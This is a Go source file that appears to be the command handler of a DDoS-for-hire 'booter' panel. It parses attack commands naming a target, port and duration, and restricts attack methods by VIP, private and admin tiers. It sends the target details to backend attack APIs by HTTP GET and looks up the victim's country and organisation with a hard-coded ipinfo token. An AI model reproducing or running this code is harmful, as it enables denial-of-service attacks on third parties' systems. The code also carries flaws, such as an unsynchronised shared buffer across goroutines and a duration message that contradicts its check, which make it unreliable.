package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type MethodInfo struct {
	defaultPort uint16
	defaultTime uint32
}

type Attack struct {
	Duration   uint32
	Type       uint8
	Target     string
	Port       string
	MethodName string
	API        []string
	Enabled    bool
}

func DisplayMethods() string {
	methods := getMethodsList()
	groupedMethods := groupMethodsByGroup(methods)

	generateTable := func(groupedMethods map[string][]Method) string {
		var builder strings.Builder
		for groupName, groupMethods := range groupedMethods {
			builder.WriteString("\u001B[107;91m " + groupName + " \n\u001B[0m")
			for _, method := range groupMethods {
				if !method.Enabled {
					builder.WriteString("\u001B[97m> " + method.Method + " -" + " (DISABLED)" + "\n")
					continue
				}
				if hasAdminPermission(method.Method) {
					builder.WriteString("\u001B[97m> " + method.Method + " -" + " (ADMIN: true)" + "\n")
				} else {
					access := " (\u001B[93mVIP: \u001B[91mfalse\u001B[97m)"
					if hasVipPermission(method.Method) {
						access = " (\u001B[93mVIP: \u001B[92mtrue\u001B[97m)"
					} else if hasPrivatePermission(method.Method) {
						access = " (\u001B[93mPRIVATE\u001B[97m)"
					}
					builder.WriteString("\u001B[97m> " + method.Method + " -" + access + "\n")
				}
			}
			builder.WriteString("\n")
		}

		return builder.String()
	}

	// Generowanie tabelki jako string dla wszystkich grup
	tableString := generateTable(groupedMethods)
	return tableString
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, vip bool, private bool, admin bool, maxtime int) (*Attack, error) {
	atk := &Attack{0, 0, str, "", "", nil, false}
	args, _ := shellwords.Parse(str)

	var atkInfo MethodInfo
	// Parse attack name
	if len(args) != 2 && len(args) != 4 && len(args) != 1 {
		return nil, errors.New("Invalid number of arguments")
	}
	if len(args) == 0 {
		return nil, errors.New("must specify an attack name")
	} else {
		method, err := getMethod(args[0])
		log.Println("vip:", vip, "needVip", hasVipPermission(method.Method))
		log.Println("private:", private, "needPrivate", hasPrivatePermission(method.Method))
		if err != nil {
			return nil, errors.New("\u001B[97mCommand not recognized. Type HELP for a list of commands")
		}
		if hasVipPermission(method.Method) && !vip {
			return nil, errors.New("\u001B[97mYou need VIP to use this method")
		}
		if hasPrivatePermission(method.Method) && !private {
			return nil, errors.New("\u001B[97mYou need to be invited to use this method")
		}
		if hasAdminPermission(method.Method) && !admin {
			return nil, errors.New("\u001B[97mYou need admin to use this method")
		}
		atkInfo.defaultPort = method.DefaultPort
		atkInfo.defaultTime = method.DefaultTime
		atk.Enabled = method.Enabled
		atk.API = method.API
		atk.MethodName = args[0]
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mYou need to specify a prefix/netmask as targets")
	} else {

		if args[0] == "?" {
			return nil, errors.New("IP Address/URL of target")
		}
		atk.Target = args[0]
		args = args[1:]
	}

	// Parse port
	if len(args) == 0 {
		atk.Duration = atkInfo.defaultTime
		atk.Port = strconv.Itoa(int(atkInfo.defaultPort))

		return atk, nil
	} else {
		if _, err := strconv.Atoi(args[0]); err != nil {
			return nil, errors.New("\u001B[91mInvalid port.\u001B[0m")
		}
		atk.Port = args[0]
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mMust specify an attack duration")
	} else {
		// Description of the time
		if args[0] == "?" {
			return nil, errors.New("\u001B[97mDuration of the attack, in seconds")
		}
		// Converting the time
		duration, err := strconv.Atoi(args[0])
		// Check if the time is over the maximum(9800).
		if err != nil || duration == 0 || duration > maxtime {
			return nil, errors.New(fmt.Sprintf("\033[91mError! \033[97mInvalid attack duration, near %s. Duration must be between 0 and 60 seconds", args[0]))
		}
		// Set the duration
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	return atk, nil
}

func (this *Attack) Build() (bool, error, string) {
    log.Println("\u001B[0m\u001B[107m\u001B[38;5;196m[ATTACK]\u001B[0m\u001B[38;5;46m Sending attack to APIs.\u001B[0m")
    apiList := this.API
    apiLen := len(apiList)
    i := 0
    if !this.Enabled {
        return false, errors.New("\u001B[0m\u001B[107m\u001B[38;5;196m Method not enabled"), ""
    }
    
    var successMessage strings.Builder
    successMessage.WriteString("\u001B[0m\u001B[107m\u001B[38;5;196m[ATTACK]\u001B[0m\u001B[38;5;46m Attack successfully sent to APIs:\u001B[0m\n")
    
    for i < apiLen {
        apiLink := apiList[i]
        apiLink = replacePlaceholders(apiLink, this.Target, this.Port, this.Duration)
        
        go func(link string) {
            res, err := http.Get(link)
            onlyUrl := strings.Split(link, "?")[0]
            if err != nil {
                log.Println("\u001B[0m\u001B[107m\u001B[38;5;208m[REQUEST]\u001B[0m\u001B[38;5;231mError sending request to:\u001B[38;5;253m", onlyUrl, err, "\u001B[0m")
                return
            }
            defer res.Body.Close()
            log.Println("\u001B[0m\u001B[107m\u001B[38;5;208m[REQUEST]\u001B[0m\u001B[38;5;231mSending request to: \u001B[38;5;253m"+onlyUrl, "\u001B[0m")
            body, err := ioutil.ReadAll(res.Body)
            if err != nil {
                log.Println("\u001B[0m\u001B[107m\u001B[38;5;208m[REQUEST]\u001B[0m\u001B[38;5;231mError reading response body:\u001B[38;5;253m", err, "\u001B[0m")
                return
            }
            log.Println("\u001B[0m\u001B[107m\u001B[38;5;210m[RESPONSE]\u001B[0m Response from "+onlyUrl+": " + string(body))
            
            // Append to success message
            successMessage.WriteString("\u001B[0m\u001B[107m\u001B[38;5;210m[RESPONSE]\u001B[0m Response from " + onlyUrl + ": " + string(body) + "\n")
        }(apiLink)
        
        i++
    }
    
    type Result struct {
        Country string `json:"country"`
        Org     string `json:"org"`
        Region  string `json:"region"`
    }
    
    asninfo, err := http.Get("https://ipinfo.io/" + this.Target + "/json?token=353e77e36c1185")
    if err != nil {
        log.Println("\u001B[0m\u001B[107m\u001B[38;5;208m[REQUEST]\u001B[0m\u001B[38;5;231mError getting ASN info for "+this.Target+":", err, "\u001B[0m")
    }
    defer asninfo.Body.Close()
    
    var data Result
    content, err := ioutil.ReadAll(asninfo.Body)
    if err != nil {
        log.Println("\u001B[0m\u001B[107m\u001B[38;5;208m[REQUEST]\u001B[0m\u001B[38;5;231mError reading ASN info response body:", err, "\u001B[0m")
    } else {
        json.Unmarshal(content, &data)
        log.Println("\u001B[0m\u001B[107m\u001B[38;5;210m[RESPONSE]\u001B[0m ASN info for "+this.Target+":", data)
    }
    
    // Construct sentMessage with all necessary information
    sentMessage := ui("attack-sent", map[string]string{
        "target":   this.Target,
        "port":     this.Port,
        "time":     strconv.Itoa(int(this.Duration)),
        "method":   this.MethodName,
        "country":  data.Country,
        "org":      data.Org,
        "region":   data.Region,
        "response": successMessage.String(), // Add the full response message here
    })
    
    log.Println(successMessage.String())
    
    return false, nil, sentMessage
}



func replacePlaceholders(apiLink string, target string, port string, duration uint32) string {
	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
	apiLink = strings.ReplaceAll(apiLink, "{HOST}", target)
	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
	apiLink = strings.ReplaceAll(apiLink, "{PORT}", port)
	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "{TIME}", strconv.Itoa(int(duration)))
	return apiLink
}
